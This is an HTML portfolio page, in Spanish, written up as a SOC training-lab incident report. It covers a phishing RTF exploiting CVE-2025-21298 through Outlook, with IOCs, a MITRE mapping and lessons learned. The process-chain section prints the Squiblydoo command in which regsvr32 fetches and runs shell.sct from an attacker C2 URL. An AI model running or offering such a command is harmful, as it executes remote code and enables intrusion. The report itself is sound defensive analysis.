@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CASE-006 · CVE-2025-21298 OLE RCE via Phishing — José Corrales</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" type="image/x-icon" href="../img/favicon.ico">
+    <link rel="stylesheet" href="../style.css">
+    <style>
+        .case-page { max-width: 860px; margin: 0 auto; padding: 48px 24px 80px; }
+        .back-link { display: inline-flex; align-items: center; gap: 8px; font-family: var(--font-mono); font-size: 0.8rem; color: var(--text); opacity: 0.6; margin-bottom: 40px; transition: all var(--transition); }
+        .back-link:hover { opacity: 1; color: var(--accent); }
+        .case-header { margin-bottom: 40px; }
+        .case-meta-row { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 16px; }
+        .case-id-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--accent); opacity: 0.7; letter-spacing: 0.1em; }
+        .case-badge { font-family: var(--font-mono); font-size: 0.65rem; padding: 2px 10px; border-radius: 20px; letter-spacing: 0.05em; }
+        .badge-tp { background: rgba(255,80,80,0.1); color: #ff6b6b; border: 1px solid rgba(255,80,80,0.2); }
+        .badge-closed { background: rgba(0,200,120,0.08); color: #00c878; border: 1px solid rgba(0,200,120,0.2); }
+        .badge-critical { background: rgba(255,0,0,0.1); color: #ff4444; border: 1px solid rgba(255,0,0,0.25); }
+        .case-header h1 { font-family: var(--font-display); font-size: clamp(1.6rem, 4vw, 2.2rem); font-weight: 800; color: var(--text-bright); letter-spacing: -0.03em; line-height: 1.2; margin-bottom: 12px; }
+        .case-header p.lead { font-size: 0.95rem; color: var(--text); line-height: 1.75; max-width: 680px; }
+        .info-bar { display: flex; flex-wrap: wrap; gap: 24px; padding: 18px 20px; background: var(--bg-2); border: 1px solid var(--border); border-radius: var(--radius); margin-bottom: 48px; }
+        .info-item { display: flex; flex-direction: column; gap: 3px; }
+        .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--accent); opacity: 0.6; letter-spacing: 0.08em; }
+        .info-value { font-family: var(--font-mono); font-size: 0.82rem; color: var(--text-2); }
+        .info-value.critical { color: #ff4444; }
+        .info-value.confirmed { color: #00c878; }
+        .case-section { margin-bottom: 48px; }
+        .case-section-title { font-family: var(--font-mono); font-size: 0.72rem; color: var(--accent); opacity: 0.6; letter-spacing: 0.1em; margin-bottom: 6px; }
+        .case-section h2 { font-family: var(--font-display); font-size: 1.15rem; font-weight: 700; color: var(--text-bright); margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid var(--border); }
+        .case-section p { font-size: 0.92rem; color: var(--text); line-height: 1.8; margin-bottom: 14px; }
+        .case-section ul { list-style: none; display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px; }
+        .case-section ul li { font-size: 0.9rem; color: var(--text); padding-left: 18px; position: relative; line-height: 1.7; }
+        .case-section ul li::before { content: '▸'; position: absolute; left: 0; color: var(--accent); opacity: 0.5; font-family: var(--font-mono); font-size: 0.75rem; }
+        .evidence-grid { display: flex; flex-direction: column; gap: 2px; margin: 20px 0; background: var(--bg-2); border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
+        .ev-row { display: flex; border-bottom: 1px solid var(--border); }
+        .ev-row:last-child { border-bottom: none; }
+        .ev-key { font-family: var(--font-mono); font-size: 0.78rem; color: var(--accent); opacity: 0.7; padding: 10px 16px; min-width: 180px; background: rgba(0,0,0,0.15); border-right: 1px solid var(--border); }
+        .ev-val { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-2); padding: 10px 16px; flex: 1; word-break: break-all; }
+        .ev-val.danger { color: #ff6b6b; }
+        .ev-val.warn { color: #ffa500; }
+        .code-block { background: #050b12; border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: var(--radius); padding: 16px 20px; margin: 16px 0; font-family: var(--font-mono); font-size: 0.78rem; color: var(--accent); overflow-x: auto; line-height: 1.9; word-break: break-all; }
+        .code-block .comment { color: var(--text); opacity: 0.4; }
+        .code-block .danger { color: #ff6b6b; }
+        .code-block .warn { color: #ffa500; }
+        .attack-timeline { display: flex; flex-direction: column; gap: 0; margin: 20px 0; position: relative; }
+        .attack-timeline::before { content: ''; position: absolute; left: 80px; top: 0; bottom: 0; width: 1px; background: var(--border); }
+        .tl-item { display: flex; gap: 20px; padding: 16px 0; }
+        .tl-time { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text); opacity: 0.5; min-width: 72px; text-align: right; padding-top: 2px; }
+        .tl-dot-wrap { position: relative; display: flex; align-items: flex-start; padding-top: 6px; }
+        .tl-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); opacity: 0.6; flex-shrink: 0; }
+        .tl-dot.high { background: #ff4444; opacity: 0.9; }
+        .tl-dot.warn { background: #ffa500; opacity: 0.8; }
+        .tl-content { flex: 1; padding-left: 8px; }
+        .tl-content strong { display: block; font-size: 0.9rem; color: var(--text-2); margin-bottom: 3px; }
+        .tl-content p { font-size: 0.84rem; color: var(--text); line-height: 1.6; margin-bottom: 0; }
+        .chain-block { background: #050b12; border: 1px solid var(--border); border-radius: var(--radius); padding: 20px 24px; margin: 20px 0; font-family: var(--font-mono); font-size: 0.8rem; line-height: 2.2; overflow-x: auto; }
+        .chain-step { color: var(--text-2); }
+        .chain-arrow { color: var(--accent); opacity: 0.4; margin: 0 8px; }
+        .chain-danger { color: #ff6b6b; }
+        .chain-warn { color: #ffa500; }
+        .chain-dim { color: var(--text); opacity: 0.4; font-size: 0.72rem; }
+        .ioc-grid { display: flex; flex-direction: column; gap: 10px; margin: 20px 0; }
+        .ioc-card { padding: 14px 18px; background: #050b12; border: 1px solid var(--border); border-radius: var(--radius); display: flex; gap: 14px; align-items: flex-start; }
+        .ioc-type { font-family: var(--font-mono); font-size: 0.65rem; color: var(--accent); opacity: 0.6; min-width: 70px; padding-top: 2px; letter-spacing: 0.05em; }
+        .ioc-content { flex: 1; }
+        .ioc-value { font-family: var(--font-mono); font-size: 0.82rem; color: #ff6b6b; word-break: break-all; margin-bottom: 3px; }
+        .ioc-desc { font-size: 0.8rem; color: var(--text); opacity: 0.7; }
+        .mitre-block { padding: 20px 24px; background: var(--bg-2); border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: var(--radius); margin: 12px 0; }
+        .mitre-block .mitre-id { font-family: var(--font-mono); font-size: 1rem; color: var(--accent); font-weight: 700; margin-bottom: 4px; }
+        .mitre-block .mitre-name { font-size: 0.95rem; color: var(--text-bright); font-weight: 600; margin-bottom: 8px; }
+        .mitre-block p { font-size: 0.88rem; color: var(--text); line-height: 1.7; margin-bottom: 0; }
+        .mitre-tags { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
+        .actions-list { display: flex; flex-direction: column; gap: 10px; margin: 20px 0; }
+        .action-item { display: flex; gap: 14px; padding: 14px 18px; background: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius); }
+        .action-num { font-family: var(--font-mono); font-size: 0.7rem; color: var(--accent); opacity: 0.5; min-width: 24px; padding-top: 1px; }
+        .action-item p { font-size: 0.88rem; color: var(--text); line-height: 1.65; margin-bottom: 0; }
+        .action-item strong { color: var(--text-2); }
+        .verdict-block { padding: 24px; background: rgba(255,68,68,0.04); border: 1px solid rgba(255,68,68,0.2); border-radius: var(--radius); margin: 20px 0; }
+        .verdict-block .verdict-label { font-family: var(--font-mono); font-size: 0.68rem; color: #ff4444; opacity: 0.8; letter-spacing: 0.1em; margin-bottom: 8px; }
+        .verdict-block p { font-size: 0.92rem; color: var(--text); line-height: 1.8; margin-bottom: 0; }
+        .lessons-grid { display: grid; grid-template-columns: 1fr; gap: 10px; margin: 20px 0; }
+        .lesson { padding: 16px 20px; background: var(--bg-card); border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: var(--radius); }
+        .lesson p { font-size: 0.88rem; color: var(--text); line-height: 1.7; margin-bottom: 0; }
+        .lesson strong { color: var(--accent); }
+        .note-block { padding: 14px 18px; background: rgba(255,165,0,0.05); border: 1px solid rgba(255,165,0,0.2); border-radius: var(--radius); margin: 16px 0; font-size: 0.86rem; color: var(--text); line-height: 1.7; }
+        .note-block strong { color: #ffa500; }
+        @media (min-width: 600px) { .lessons-grid { grid-template-columns: 1fr 1fr; } }
+    </style>
+</head>
+<body>
+
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="noise" aria-hidden="true"></div>
+    <div class="cursor-glow" id="cursorGlow" aria-hidden="true"></div>
+
+    <div class="case-page">
+
+        <a href="../index.html#projects" class="back-link">
+            <i class="fas fa-arrow-left fa-xs"></i> Volver al portafolio
+        </a>
+
+        <header class="case-header">
+            <div class="case-meta-row">
+                <span class="case-id-label mono">// CASE-006 · SOC336</span>
+                <span class="case-badge badge-tp">True Positive</span>
+                <span class="case-badge badge-closed">Cerrado</span>
+                <span class="case-badge badge-critical">Critical</span>
+            </div>
+            <h1>CVE-2025-21298 OLE RCE —<br>Phishing RTF con LOLBIN via Outlook</h1>
+            <p class="lead">
+                Explotación de vulnerabilidad zero-click en Windows OLE mediante archivo RTF malicioso 
+                entregado por correo. Outlook procesó el adjunto y ejecutó una cadena de procesos que 
+                resultó en la descarga de un payload remoto usando regsvr32.exe como LOLBIN. 
+                Endpoint comprometido con conexión C2 activa confirmada.
+            </p>
+        </header>
+
+        <div class="info-bar">
+            <div class="info-item">
+                <span class="info-label">// fecha</span>
+                <span class="info-value">04 Feb 2025 · 04:18 PM</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">// severidad</span>
+                <span class="info-value critical">Crítica</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">// fuente</span>
+                <span class="info-value">LetsDefend · SOC336</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">// clasificación</span>
+                <span class="info-value confirmed">True Positive</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">// cve</span>
+                <span class="info-value critical">CVE-2025-21298</span>
+            </div>
+        </div>
+
+        <!-- Resumen -->
+        <div class="case-section">
+            <p class="case-section-title">// 01_resumen</p>
+            <h2>Resumen ejecutivo</h2>
+            <p>
+                El sistema detectó la explotación de <strong>CVE-2025-21298</strong>, una vulnerabilidad 
+                zero-click en Windows OLE que permite ejecución remota de código al procesar un archivo 
+                RTF malicioso. El usuario <strong>Austin</strong> recibió un correo desde 
+                <strong>projectmanagement@pm.me</strong> con el adjunto <strong>mail.rtf</strong> — 
+                hash confirmado como malicioso en VirusTotal.
+            </p>
+            <p>
+                La cadena de procesos <strong>OUTLOOK.EXE → cmd.exe → regsvr32.exe</strong> confirma 
+                que el exploit se ejecutó desde el cliente de correo sin necesidad de que el usuario 
+                abriera manualmente el archivo. regsvr32.exe descargó y ejecutó <strong>shell.sct</strong> 
+                desde la IP <strong>84.38.130.118</strong> (Letonia, 7/91 VT), estableciendo comunicación 
+                con infraestructura C2 del atacante.
+            </p>
+
+            <div class="verdict-block">
+                <p class="verdict-label">// veredicto — compromiso confirmado</p>
+                <p>
+                    <strong>True Positive crítico.</strong> Explotación exitosa de CVE-2025-21298 con RCE 
+                    confirmado, conexión C2 activa y descarga de payload remoto. Endpoint de Austin 
+                    comprometido. Requiere aislamiento inmediato, cuarentena del archivo malicioso, 
+                    análisis forense y revisión de otros endpoints que hayan recibido el mismo correo.
+                </p>
+            </div>
+        </div>
+
+        <!-- Evidencia -->
+        <div class="case-section">
+            <p class="case-section-title">// 02_evidencia</p>
+            <h2>Evidencia técnica</h2>
+
+            <div class="evidence-grid">
+                <div class="ev-row">
+                    <span class="ev-key">Usuario víctima</span>
+                    <span class="ev-val">Austin (Austin@letsdefend.io)</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Remitente malicioso</span>
+                    <span class="ev-val danger">projectmanagement@pm.me</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Archivo adjunto</span>
+                    <span class="ev-val danger">mail.rtf</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Hash adjunto (SHA256)</span>
+                    <span class="ev-val danger">df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">CVE explotado</span>
+                    <span class="ev-val danger">CVE-2025-21298 — Windows OLE Zero-Click RCE</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">IP C2</span>
+                    <span class="ev-val danger">84.38.130.118 (Letonia · 7/91 VT · Malicioso)</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Payload descargado</span>
+                    <span class="ev-val danger">http://84.38.130.118.com/shell.sct</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">LOLBIN utilizado</span>
+                    <span class="ev-val danger">regsvr32.exe (Squiblydoo)</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Proceso padre</span>
+                    <span class="ev-val warn">OUTLOOK.EXE — generó cmd.exe hijo</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Cadena de ataque -->
+        <div class="case-section">
+            <p class="case-section-title">// 03_cadena</p>
+            <h2>Cadena de procesos — RCE confirmado</h2>
+            <p>
+                La siguiente cadena de procesos fue identificada en el endpoint de Austin, 
+                confirmando la ejecución del exploit desde Outlook sin interacción explícita del usuario:
+            </p>
+
+            <div class="chain-block">
+                <div><span class="chain-danger">projectmanagement@pm.me</span> <span class="chain-dim">// correo malicioso con mail.rtf adjunto</span></div>
+                <div><span class="chain-arrow">▼</span> entrega exitosa a Austin</div>
+                <div><span class="chain-step">OUTLOOK.EXE</span> <span class="chain-dim">// procesamiento del adjunto RTF — CVE-2025-21298</span></div>
+                <div><span class="chain-arrow">▼</span> spawn (zero-click)</div>
+                <div><span class="chain-warn">cmd.exe</span> <span class="chain-dim">// proceso hijo generado por Outlook</span></div>
+                <div><span class="chain-arrow">▼</span> ejecuta</div>
+                <div><span class="chain-danger">regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll</span></div>
+                <div><span class="chain-arrow">▼</span> descarga y ejecuta</div>
+                <div><span class="chain-danger">shell.sct</span> <span class="chain-dim">// payload remoto desde C2 · conexión GET confirmada</span></div>
+            </div>
+
+            <div class="code-block">
+                <span class="comment">// Comando completo ejecutado en el endpoint</span><br><br>
+                cmd.exe /c <span class="danger">regsvr32.exe</span> /s /u<br>
+                /i:<span class="warn">http://84.38.130.118.com/shell.sct</span><br>
+                <span class="danger">scrobj.dll</span>
+            </div>
+
+            <p>
+                El uso de <strong>regsvr32.exe</strong> con el parámetro <code>/i:</code> apuntando a 
+                una URL remota es conocido como la técnica <strong>Squiblydoo</strong> — permite descargar 
+                y ejecutar scripts remotos (.sct) sin escribir archivos al disco, bypasseando controles 
+                de AppLocker y evadiendo detección basada en archivos.
+            </p>
+        </div>
+
+        <!-- Timeline -->
+        <div class="case-section">
+            <p class="case-section-title">// 04_timeline</p>
+            <h2>Línea de tiempo del incidente</h2>
+
+            <div class="attack-timeline">
+                <div class="tl-item">
+                    <span class="tl-time">Previo</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot"></div></div>
+                    <div class="tl-content">
+                        <strong>Envío del correo malicioso</strong>
+                        <p>Correo enviado desde projectmanagement@pm.me a Austin@letsdefend.io con mail.rtf adjunto. El remitente usa un dominio genérico pm.me para aparentar legitimidad.</p>
+                    </div>
+                </div>
+                <div class="tl-item">
+                    <span class="tl-time">16:18</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot high"></div></div>
+                    <div class="tl-content">
+                        <strong>Procesamiento del RTF por Outlook — Zero-click</strong>
+                        <p>Outlook procesa mail.rtf explotando CVE-2025-21298. No se requiere que el usuario abra manualmente el archivo — la vulnerabilidad se activa durante la previsualización o procesamiento automático.</p>
+                    </div>
+                </div>
+                <div class="tl-item">
+                    <span class="tl-time">16:18</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot high"></div></div>
+                    <div class="tl-content">
+                        <strong>RCE — Outlook genera cmd.exe hijo</strong>
+                        <p>OUTLOOK.EXE genera cmd.exe como proceso hijo. Esta relación padre-hijo es anómala y confirma ejecución de código remoto exitosa.</p>
+                    </div>
+                </div>
+                <div class="tl-item">
+                    <span class="tl-time">16:18</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot high"></div></div>
+                    <div class="tl-content">
+                        <strong>Descarga de payload via regsvr32.exe (Squiblydoo)</strong>
+                        <p>regsvr32.exe descarga y ejecuta shell.sct desde 84.38.130.118. Conexión GET confirmada. Payload ejecutado en memoria sin escribir archivos al disco.</p>
+                    </div>
+                </div>
+                <div class="tl-item">
+                    <span class="tl-time">Post</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot warn"></div></div>
+                    <div class="tl-content">
+                        <strong>Endpoint comprometido — C2 activo</strong>
+                        <p>Comunicación establecida con infraestructura C2 en Letonia. Endpoint aislado de la red. Archivo malicioso no puesto en cuarentena — acción pendiente.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- IOCs -->
+        <div class="case-section">
+            <p class="case-section-title">// 05_iocs</p>
+            <h2>Indicadores de compromiso (IOCs)</h2>
+
+            <div class="ioc-grid">
+                <div class="ioc-card">
+                    <span class="ioc-type">EMAIL</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">projectmanagement@pm.me</div>
+                        <div class="ioc-desc">Remitente malicioso — origen del correo de phishing</div>
+                    </div>
+                </div>
+                <div class="ioc-card">
+                    <span class="ioc-type">SHA256</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184</div>
+                        <div class="ioc-desc">mail.rtf — archivo RTF malicioso · CVE-2025-21298</div>
+                    </div>
+                </div>
+                <div class="ioc-card">
+                    <span class="ioc-type">IP</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">84.38.130.118</div>
+                        <div class="ioc-desc">C2 del atacante — Letonia · 7/91 VT · Malicioso</div>
+                    </div>
+                </div>
+                <div class="ioc-card">
+                    <span class="ioc-type">URL</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">http://84.38.130.118.com/shell.sct</div>
+                        <div class="ioc-desc">Payload remoto descargado via regsvr32.exe</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- MITRE -->
+        <div class="case-section">
+            <p class="case-section-title">// 06_mitre</p>
+            <h2>Mapeo MITRE ATT&CK</h2>
+
+            <div class="mitre-block">
+                <div class="mitre-id">T1566.001 — Spearphishing Attachment</div>
+                <div class="mitre-name">Táctica: Initial Access</div>
+                <p>Correo de phishing con archivo RTF malicioso adjunto enviado al usuario Austin para desencadenar la explotación de CVE-2025-21298 en el cliente de correo.</p>
+                <div class="mitre-tags">
+                    <span class="tag">T1566.001</span>
+                    <span class="tag">Initial Access</span>
+                    <span class="tag">TA0001</span>
+                </div>
+            </div>
+
+            <div class="mitre-block">
+                <div class="mitre-id">T1218.010 — Regsvr32 (Squiblydoo)</div>
+                <div class="mitre-name">Táctica: Defense Evasion · Execution</div>
+                <p>Uso de regsvr32.exe con parámetro /i: apuntando a URL remota para descargar y ejecutar shell.sct sin escribir archivos al disco, bypasseando AppLocker y controles de ejecución.</p>
+                <div class="mitre-tags">
+                    <span class="tag">T1218.010</span>
+                    <span class="tag">Defense Evasion</span>
+                    <span class="tag">LOLBIN · Squiblydoo</span>
+                    <span class="tag">TA0005</span>
+                </div>
+            </div>
+
+            <div class="mitre-block">
+                <div class="mitre-id">T1105 — Ingress Tool Transfer</div>
+                <div class="mitre-name">Táctica: Command and Control</div>
+                <p>Descarga de shell.sct desde infraestructura C2 externa (84.38.130.118) hacia el endpoint comprometido durante la ejecución del payload.</p>
+                <div class="mitre-tags">
+                    <span class="tag">T1105</span>
+                    <span class="tag">Command and Control</span>
+                    <span class="tag">TA0011</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Acciones -->
+        <div class="case-section">
+            <p class="case-section-title">// 07_acciones</p>
+            <h2>Acciones tomadas</h2>
+
+            <div class="actions-list">
+                <div class="action-item">
+                    <span class="action-num">01</span>
+                    <p><strong>Análisis del correo malicioso:</strong> Identificado remitente (projectmanagement@pm.me), destinatario (Austin) y adjunto (mail.rtf). Hash verificado en VirusTotal — confirmado malicioso.</p>
+                </div>
+                <div class="action-item">
+                    <span class="action-num">02</span>
+                    <p><strong>Verificación de C2:</strong> IP 84.38.130.118 confirmada como maliciosa en VirusTotal (7/91, Letonia). Conexión GET a shell.sct confirmada en logs de red.</p>
+                </div>
+                <div class="action-item">
+                    <span class="action-num">03</span>
+                    <p><strong>Análisis de cadena de procesos:</strong> OUTLOOK.EXE → cmd.exe → regsvr32.exe confirma RCE exitoso. Identificada técnica Squiblydoo (T1218.010) para evasión de controles.</p>
+                </div>
+                <div class="action-item">
+                    <span class="action-num">04</span>
+                    <p><strong>Verificación de propagación:</strong> Revisión de otros endpoints — ninguno recibió el mismo hash ni nombre de archivo. Compromiso limitado al endpoint de Austin.</p>
+                </div>
+                <div class="action-item">
+                    <span class="action-num">05</span>
+                    <p><strong>Aislamiento del endpoint:</strong> Endpoint de Austin aislado de la red para contener comunicación C2 activa.</p>
+                </div>
+            </div>
+
+            <div class="note-block">
+                <strong>Acción omitida — punto de mejora:</strong> El archivo malicioso mail.rtf no fue puesto en cuarentena durante la respuesta. En un SOC real, el aislamiento del endpoint y la cuarentena del archivo son acciones paralelas — no excluyentes. Aislar el equipo no elimina el archivo del sistema ni previene su re-ejecución si el equipo es reincorporado a la red sin limpieza previa.
+            </div>
+        </div>
+
+        <!-- Recomendaciones -->
+        <div class="case-section">
+            <p class="case-section-title">// 08_recomendaciones</p>
+            <h2>Recomendaciones</h2>
+            <ul>
+                <li><strong>Poner en cuarentena mail.rtf</strong> del sistema de Austin — el archivo debe ser removido y preservado para análisis forense</li>
+                <li><strong>Bloquear 84.38.130.118</strong> en firewall perimetral y DNS para cortar comunicación C2</li>
+                <li>Buscar y eliminar <strong>otros correos con el mismo adjunto</strong> en todos los buzones del entorno</li>
+                <li><strong>Aplicar parche CVE-2025-21298</strong> en todos los sistemas Windows con Outlook instalado de forma urgente</li>
+                <li>Revisar si <strong>regsvr32.exe</strong> debe estar bloqueado via AppLocker para usuarios no administrativos</li>
+                <li>Realizar <strong>análisis forense completo</strong> del endpoint para determinar qué ejecutó shell.sct y si hubo persistencia o movimiento lateral</li>
+                <li>Implementar reglas de <strong>detección de Squiblydoo</strong> en el EDR para alertar ante uso de regsvr32 con URLs remotas</li>
+            </ul>
+        </div>
+
+        <!-- Lecciones -->
+        <div class="case-section">
+            <p class="case-section-title">// 09_lecciones</p>
+            <h2>Lecciones aprendidas</h2>
+
+            <div class="lessons-grid">
+                <div class="lesson">
+                    <p><strong>Aislamiento y cuarentena son acciones distintas y complementarias.</strong> Aislar el endpoint corta la comunicación de red pero no elimina el archivo malicioso del sistema. Ambas acciones deben ejecutarse — el archivo debe ser puesto en cuarentena para análisis forense y para evitar re-ejecución.</p>
+                </div>
+                <div class="lesson">
+                    <p><strong>OUTLOOK.EXE generando cmd.exe es siempre una alerta crítica.</strong> Un cliente de correo nunca debería tener un intérprete de comandos como proceso hijo. Esta relación padre-hijo es suficiente para confirmar RCE sin necesidad de analizar el payload.</p>
+                </div>
+                <div class="lesson">
+                    <p><strong>Zero-click significa que el usuario no necesita hacer nada.</strong> CVE-2025-21298 se activa durante el procesamiento del RTF por Outlook, no al abrirlo manualmente. La ausencia de apertura explícita en los logs no descarta la explotación.</p>
+                </div>
+                <div class="lesson">
+                    <p><strong>Squiblydoo (regsvr32 + URL remota) evade controles de disco.</strong> Al ejecutar el payload directamente desde la URL sin escribirlo al disco, bypasea soluciones de seguridad que solo inspeccionan archivos. La detección debe basarse en comportamiento de procesos, no en archivos.</p>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <span class="mono dim">© 2026 José Corrales</span>
+            <span class="dim">·</span>
+            <span class="mono dim">CASE-006 · SOC336 · CVE-2025-21298</span>
+        </footer>
+
+    </div>
+
+    <script>
+        const glow = document.getElementById('cursorGlow');
+        document.addEventListener('mousemove', e => {
+            glow.style.left = e.clientX + 'px';
+            glow.style.top = e.clientY + 'px';
+        });
+    </script>
+
+</body>
+</html>
